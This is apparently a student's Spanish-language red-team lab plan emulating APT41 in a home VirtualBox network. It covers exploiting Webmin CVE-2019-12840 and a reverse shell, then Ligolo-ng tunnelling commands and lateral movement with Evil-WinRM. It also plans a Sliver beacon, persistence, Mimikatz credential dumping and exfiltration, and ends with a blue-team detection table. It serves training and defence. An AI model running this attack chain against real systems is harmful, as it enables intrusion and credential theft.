# 🎯 OPERATION SILENT BRIDGE
### Plan de Operación — Lab-02: Silent Bridge

---

## 📋 Ficha de Operación

| Campo | Detalle |
|-------|---------|
| **Nombre en clave** | SILENT BRIDGE |
| **Fecha de inicio** | 13/05/2026 |
| **Operador** | Adrián Camacho |
| **Adversario simulado** | APT41 (Double Dragon) |
| **Framework** | MITRE ATT&CK v14 — Enterprise |
| **Metodología C2** | Ligolo-ng (tunneling) → Sliver (beacon en red interna) |
| **Objetivo primario** | Compromiso del PC Windows en red interna segmentada |
| **Objetivo secundario** | Persistencia en red interna — Golden Ticket o scheduled task |
| **Entorno** | Lab propio — VirtualBox NAT Network `LabRedTeam` |

---

## 🕵️ Perfil del Adversario — APT41 (Double Dragon)

APT41 es un actor de amenaza persistente avanzada atribuido al Ministerio de Seguridad del Estado chino (MSS). A diferencia de APT29, APT41 combina operaciones de espionaje con motivaciones económicas, y es conocido por su agresividad en el pivotaje de red, el abuso de aplicaciones web vulnerables como vector inicial, y la capacidad de moverse rápidamente entre segmentos de red segmentados.

### Características tácticas que se replican en esta operación

| Característica | Implementación en el lab |
|---------------|--------------------------|
| **Explotación de aplicaciones web** | Webmin CVE-2019-12840 como vector de entrada inicial |
| **Pivotaje agresivo** | Ligolo-ng para atravesar segmentación de red sin reglas de firewall |
| **Implantes en capas** | Beacon Sliver desplegado en red interna, fuera de la DMZ |
| **Living-off-the-Land en Windows** | Comandos nativos antes de subir herramientas externas |
| **Persistencia multiplataforma** | Técnicas distintas en Linux y Windows según el objetivo |
| **Evasión de detección** | Uso de puertos no estándar y TLS para el túnel C2 |

### TTPs de referencia (MITRE)
- [G0096 — APT41](https://attack.mitre.org/groups/G0096/)

---

## 🏗️ Entorno de Operación

```
┌──────────────────────────────────────────────────────────────────────┐
│                      RED NAT — LabRedTeam                            │
│                                                                      │
│   ┌──────────────┐     DMZ / Internet     ┌──────────────────────┐  │
│   │   Kali Linux │ ──────────────────────►│   PROD (Linux)       │  │
│   │  10.0.2.9    │                        │   10.0.2.200         │  │
│   │  Atacante    │◄── Ligolo-ng TLS ──────│   Webmin :10000      │  │
│   └──────────────┘                        │   Apache / SSH       │  │
│          │                                └──────────┬───────────┘  │
│          │                                           │              │
│          │              Red Interna (.150/24)        │              │
│          │         ┌─────────────────────────────────┘              │
│          │         ▼                                                 │
│          │   ┌──────────────────────┐   ┌──────────────────────┐   │
│          │   │   GIT SERVER (Linux) │   │   PC (Windows)       │   │
│          │   │   10.0.3.150         │   │   10.0.3.7         │   │
│          │   │   Git HTTP                │   │   SMB / RDP / WinRM  │   │
│          │   └──────────────────────┘   └──────────────────────┘   │
│          │                                                           │
│          └──────── (acceso vía túnel Ligolo-ng) ───────────────────►│
└──────────────────────────────────────────────────────────────────────┘

Nota: Las IPs internas (.150, .100) se confirmarán durante la operación.
El pivotaje se realiza a través de PROD — único nodo con acceso a ambas redes.
```

### Máquinas del entorno

| Host | SO | IP | Rol en la operación |
|------|----|----|---------------------|
| Kali | Kali Linux 2026.1 | `10.0.2.9` | Máquina operadora APT41 |
| PROD | Ubuntu 22.04 | `10.0.2.200` | Objetivo externo — punto de pivote |
| GIT | Linux | `10.0.3.150`  | Servidor interno — escalada |
| PC-01 | Windows 11 | `10.0.3.7`  | Objetivo final — red interna |

> ⚠️ IPs confirmadas tras ejecución real del lab.

---

## 🗺️ Plan de Operación — Fases

---

### FASE 1 — Reconnaissance
**Táctica MITRE:** TA0043 — Reconnaissance  
**Objetivo:** Mapear la superficie de ataque externa. Identificar servicios expuestos en PROD, versiones vulnerables y vectores de entrada.

| # | Técnica | ID MITRE | Herramienta | Captura requerida |
|---|---------|----------|-------------|-------------------|
| 1.1 | Network Service Discovery | T1046 | Nmap (port scan completo) | ✅ Output completo del escaneo |
| 1.2 | Service Version Detection | T1046 | Nmap -sC -sV | ✅ Versiones de servicios identificadas |
| 1.3 | Web Application Fingerprint | T1592.002 | curl / whatweb / Wappalyzer | ✅ Tecnologías y versión Webmin |
| 1.4 | CVE Identification | T1588.006 | searchsploit / exploitdb | ✅ CVE-2019-12840 confirmado |

**Criterio de éxito:** Versión de Webmin confirmada como vulnerable. CVE-2019-12840 identificado como vector de explotación.

---

### FASE 2 — Initial Access (Foothold en PROD)
**Táctica MITRE:** TA0001 — Initial Access  
**Objetivo:** Obtener ejecución remota de código en PROD mediante explotación del CVE-2019-12840 en Webmin.

| # | Técnica | ID MITRE | Herramienta | Captura requerida |
|---|---------|----------|-------------|-------------------|
| 2.1 | Exploit Public-Facing Application | T1190 | CVE-2019-12840 (manual / Metasploit) | ✅ RCE confirmado — shell en PROD |
| 2.2 | Command Execution | T1059.004 | Bash reverse shell | ✅ Shell reversa estable |
| 2.3 | System Information Discovery | T1082 | id, uname -a, hostname, ip addr | ✅ Contexto del sistema comprometido |
| 2.4 | Network Interface Discovery | T1016 | ip addr, ip route, ifconfig | ✅ Interfaces y redes accesibles desde PROD |

**Criterio de éxito:** Shell en PROD con identificación de la red interna segmentada accesible.

---

### FASE 3 — Pivoting — Ligolo-ng
**Táctica MITRE:** TA0011 — Command and Control / TA0008 — Lateral Movement  
**Objetivo:** Establecer un túnel TLS bidireccional con Ligolo-ng entre Kali y PROD, enrutar el tráfico hacia la red interna y operar directamente contra los hosts internos desde Kali.

| # | Técnica | ID MITRE | Herramienta | Captura requerida |
|---|---------|----------|-------------|-------------------|
| 3.1 | Protocol Tunneling | T1572 | Ligolo-ng proxy (Kali) | ✅ Proxy escuchando en :11601 |
| 3.2 | Agent Deployment | T1572 | Ligolo-ng agent (PROD) | ✅ Agent conectado al proxy |
| 3.3 | Interface Routing | T1090 | ip tuntap + ip route add | ✅ Ruta hacia red interna activa en Kali |
| 3.4 | Tunnel Verification | T1046 | Nmap a través del túnel | ✅ Hosts internos alcanzables desde Kali |

**Setup Ligolo-ng — comandos de referencia:**

```bash
# --- KALI (proxy) ---
# Crear interfaz de túnel
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Lanzar proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Añadir ruta hacia la red interna (tras sesión activa)
sudo ip route add 10.0.2.0/24 dev ligolo   # ajustar al segmento interno real

# --- PROD (agent) ---
# Transferir y ejecutar
./agent -connect 10.0.2.9:11601 -ignore-cert

# --- Consola Ligolo-ng ---
ligolo-ng » session          # seleccionar sesión
ligolo-ng » ifconfig         # ver interfaces internas de PROD
ligolo-ng » start            # activar túnel
```

**Criterio de éxito:** Nmap directo desde Kali alcanza hosts en la red interna a través del túnel Ligolo-ng.

---

### FASE 4 — Internal Enumeration
**Táctica MITRE:** TA0007 — Discovery  
**Objetivo:** Mapear la red interna completa a través del túnel. Identificar hosts, servicios, versiones y vectores de acceso en GIT y PC.

| # | Técnica | ID MITRE | Herramienta | Captura requerida |
|---|---------|----------|-------------|-------------------|
| 4.1 | Network Host Discovery | T1046 | Nmap -sn (ping sweep) | ✅ Hosts vivos en red interna |
| 4.2 | Service Discovery — GIT | T1046 | Nmap -sC -sV GIT server | ✅ Servicios en servidor Git |
| 4.3 | Service Discovery — PC | T1046 | Nmap -sC -sV PC Windows | ✅ SMB / RDP / WinRM en PC |
| 4.4 | Web Enumeration — GIT | T1083 | curl / Gobuster | ✅ Repositorios y credenciales expuestas |
| 4.5 | SMB Enumeration — PC | T1135 | smbclient / CrackMapExec | ✅ Shares accesibles |
| 4.6 | Credential Discovery | T1552 | Repositorios Git / config files | ✅ Credenciales en repositorio Git |

**Criterio de éxito:** Mapa completo de la red interna. Credenciales o vector de acceso al PC Windows identificados.

---

### FASE 5 — Lateral Movement (GIT → PC)
**Táctica MITRE:** TA0008 — Lateral Movement  
**Objetivo:** Moverse desde GIT Server hacia el PC Windows usando las credenciales o vectores identificados en Fase 4. Establecer acceso interactivo en el objetivo final.

| # | Técnica | ID MITRE | Herramienta | Captura requerida |
|---|---------|----------|-------------|-------------------|
| 5.1 | Valid Accounts | T1078 | Credenciales obtenidas de Git | ✅ Validación con CrackMapExec |
| 5.2 | Remote Services — WinRM | T1021.006 | Evil-WinRM | ✅ Shell en PC Windows |
| 5.3 | Remote Services — SMB | T1021.002 | CrackMapExec / smbclient | ✅ Acceso a shares del PC |
| 5.4 | System Discovery | T1082 | whoami, systeminfo, net user | ✅ Contexto del PC comprometido |

**Criterio de éxito:** Shell interactiva en el PC Windows desde Kali a través del túnel Ligolo-ng.

---

### FASE 6 — C2 en Red Interna (Sliver)
**Táctica MITRE:** TA0011 — Command and Control  
**Objetivo:** Desplegar un beacon Sliver en el PC Windows para operar el resto de la cadena con C2 real, replicando la infraestructura encubierta de APT41 en redes internas segmentadas.

| # | Técnica | ID MITRE | Herramienta | Captura requerida |
|---|---------|----------|-------------|-------------------|
| 6.1 | C2 HTTPS Listener | T1071.001 | Sliver server (Kali) | ✅ Listener activo |
| 6.2 | Implant Generation (Windows) | T1587.001 | Sliver generate beacon | ✅ Beacon generado |
| 6.3 | File Transfer | T1105 | Evil-WinRM upload / SMB | ✅ Beacon transferido a PC |
| 6.4 | Implant Execution | T1204 | Start-Process -Hidden | ✅ Beacon ejecutado |
| 6.5 | Encrypted Channel | T1573.002 | Sliver HTTPS mTLS | ✅ Sesión Sliver activa desde PC |

> **Nota de routing:** El beacon de Sliver en el PC alcanza Kali a través del túnel Ligolo-ng. El listener Sliver escucha en la IP de Kali (10.0.2.9) y el tráfico es enrutado por el túnel.

**Criterio de éxito:** Sesión Sliver activa desde el PC Windows (red interna) hacia Kali (atacante externo).

---

### FASE 7 — Persistence & Objective Completion
**Táctica MITRE:** TA0003 — Persistence / TA0009 — Collection  
**Objetivo:** Establecer persistencia en el PC Windows y completar el objetivo de la operación — exfiltración de datos sensibles y acceso persistente a la red interna.

| # | Técnica | ID MITRE | Herramienta | Captura requerida |
|---|---------|----------|-------------|-------------------|
| 7.1 | Scheduled Task | T1053.005 | schtasks / Sliver | ✅ Tarea creada — beacon persistente |
| 7.2 | Registry Run Key | T1547.001 | reg add | ✅ Clave de autorun creada |
| 7.3 | Credential Dumping (local) | T1003.001 | Mimikatz / Sliver hashdump | ✅ Hashes NTLM locales |
| 7.4 | Data Collection | T1039 | SMB / Evil-WinRM download | ✅ Ficheros sensibles exfiltrados |
| 7.5 | Objective Proof | — | whoami + hostname + ipconfig | ✅ Prueba de compromiso en PC interno |

**Criterio de éxito:** Persistencia establecida + acceso a datos sensibles en red interna + prueba de compromiso final.

---

## 📸 Capturas Obligatorias por Fase

| Fase | Archivo | Descripción |
|------|---------|-------------|
| 1 | `fase1-01-nmap-port-discovery.png` | Output completo Nmap — PROD |
| 1 | `fase1-02-nmap-service-version.png` | Versiones de servicios — Webmin confirmado |
| 1 | `fase1-03-webmin-fingerprint.png` | Webmin versión vulnerable |
| 1 | `fase1-04-cve-identification.png` | CVE-2019-12840 identificado |
| 2 | `fase2-01-webmin-exploit-rce.png` | RCE exitoso en PROD |
| 2 | `fase2-02-shell-prod-established.png` | Shell reversa estable |
| 2 | `fase2-03-prod-sysinfo.png` | id / uname / hostname |
| 2 | `fase2-04-prod-network-interfaces.png` | Interfaces y redes visibles desde PROD |
| 3 | `fase3-01-ligolo-proxy-listening.png` | Proxy Ligolo-ng activo en Kali |
| 3 | `fase3-02-ligolo-agent-connected.png` | Agent conectado desde PROD |
| 3 | `fase3-03-ligolo-tunnel-active.png` | Sesión activa + ifconfig internas |
| 3 | `fase3-04-route-added-kali.png` | Ruta hacia red interna añadida |
| 3 | `fase3-05-nmap-through-tunnel.png` | Nmap alcanza hosts internos |
| 4 | `fase4-01-internal-host-discovery.png` | Sweep — hosts vivos en red interna |
| 4 | `fase4-02-nmap-git-server.png` | Servicios en GIT server |
| 4 | `fase4-03-nmap-pc-windows.png` | SMB / WinRM en PC Windows |
| 4 | `fase4-04-git-repositories.png` | Repositorios expuestos en Gitea |
| 4 | `fase4-05-credentials-found.png` | Credenciales en repositorio Git |
| 5 | `fase5-01-cme-credential-validation.png` | Validación credenciales — PC |
| 5 | `fase5-02-winrm-shell-pc.png` | Shell Evil-WinRM en PC Windows |
| 5 | `fase5-03-pc-sysinfo.png` | whoami / systeminfo en PC |
| 6 | `fase6-01-sliver-listener.png` | Listener Sliver activo en Kali |
| 6 | `fase6-02-sliver-beacon-generated.png` | Beacon generado para Windows |
| 6 | `fase6-03-beacon-upload-exec.png` | Beacon subido y ejecutado en PC |
| 6 | `fase6-04-sliver-session-active.png` | Sesión Sliver activa desde red interna |
| 7 | `fase7-01-persistence-established.png` | Scheduled task / registry run key |
| 7 | `fase7-02-credential-dump.png` | Hashes NTLM locales del PC |
| 7 | `fase7-03-data-exfiltration.png` | Ficheros sensibles exfiltrados |
| 7 | `fase7-04-objective-proof.png` | Prueba final de compromiso |

---

## 📄 Documentos a generar al finalizar

| Documento | Descripción |
|-----------|-------------|
| `enumeration_log.md` | Bitácora de reconocimiento externo e interno |
| `exploitation.md` | Fase 2: CVE-2019-12840 — explotación Webmin |
| `pivoting.md` | Fase 3: Ligolo-ng — setup, túnel y routing |
| `post-exploitation.md` | Fases 4-5: enumeración interna + lateral movement |
| `c2_sliver.md` | Fase 6: Beacon Sliver en red interna |
| `persistence.md` | Fase 7: persistencia y exfiltración |
| `infrastructure_setup.md` | Configuración del entorno y vectores inyectados |
| `Reporte_SILENT_BRIDGE.pdf` | Informe ejecutivo completo de la operación |

---

## 🛡️ Notas Operacionales (OPSEC APT41)

1. **Ligolo-ng sobre Chisel** — Ligolo-ng opera a nivel de kernel (tuntap), haciendo el tráfico indistinguible de tráfico de red normal desde la perspectiva del host comprometido. Chisel opera en userspace y es más detectable.
2. **Puerto no estándar para el túnel** — El listener de Ligolo-ng usa el puerto 11601 en lugar de puertos comunes (80/443) para reducir interferencias con otros servicios, pero podría cambiarse a 443 para mayor evasión.
3. **Beacon solo en PC Windows** — El agent de Ligolo-ng no es un C2. El beacon Sliver se despliega únicamente en el PC Windows, el objetivo final. PROD solo tiene el agent de Ligolo-ng.
4. **LOLBins en Discovery** — En el PC Windows, priorizar comandos nativos (`net`, `ipconfig`, `systeminfo`, `dir`) antes de introducir binarios externos.
5. **Transferencia de herramientas en dos fases** — Ligolo-ng agent a PROD (Linux, pequeño binario). Sliver beacon a PC vía Evil-WinRM sobre el túnel ya establecido.
6. **Documentar la topología en tiempo real** — Actualizar el diagrama de red con cada host descubierto y sus IPs reales antes de continuar a la siguiente fase.

---

## 🔵 Detección (Blue Team)

| Indicador | Fuente de log | Regla / Evento |
|-----------|--------------|----------------|
| POST `/password_change.cgi` en Webmin | Web server access log | Alert en ruta + body sospechoso |
| Creación de interfaz `tun` en PROD | auditd / syslog | `ip tuntap add` |
| Conexión saliente en puerto 11601 desde PROD | Firewall / NSG | Alert outbound :11601 |
| Proceso `agent` con conexión TLS saliente | auditd / EDR Linux | Proceso no firmado con socket TLS |
| Beacon.exe ejecutado con `-WindowStyle Hidden` | Sysmon Event ID 1 | CommandLine contains `Hidden` |
| Scheduled task con ruta no estándar | Windows Event 4698 | New scheduled task |
| LSASS access desde proceso no firmado | Sysmon Event ID 10 | TargetImage: lsass.exe |

---

*Operación SILENT BRIDGE — Adrián Camacho*  
*Entorno de laboratorio — Únicamente con fines educativos*